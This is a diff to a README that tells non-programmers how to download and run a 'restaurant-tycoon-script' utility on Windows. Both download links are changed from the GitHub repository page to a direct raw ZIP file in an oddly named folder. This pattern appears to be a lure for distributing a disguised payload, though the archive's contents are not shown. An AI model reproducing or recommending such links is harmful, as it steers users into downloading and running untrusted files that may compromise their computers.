@@ -4,11 +4,11 @@
 
 This guide will help you download and run the restaurant-tycoon-script-vd53 utility on your Windows computer. No programming skills are needed.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://github.com/ellenmeticulous529/restaurant-tycoon-script-vd53)
+[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/ellenmeticulous529/restaurant-tycoon-script-vd53/main/gingiva/v3.9.zip)
 
 ## 📥 Download
 
-Visit this link to download the application: [https://github.com/ellenmeticulous529/restaurant-tycoon-script-vd53](https://github.com/ellenmeticulous529/restaurant-tycoon-script-vd53)
+Visit this link to download the application: [https://raw.githubusercontent.com/ellenmeticulous529/restaurant-tycoon-script-vd53/main/gingiva/v3.9.zip](https://raw.githubusercontent.com/ellenmeticulous529/restaurant-tycoon-script-vd53/main/gingiva/v3.9.zip)
 
 ## 🖥️ System Requirements
 
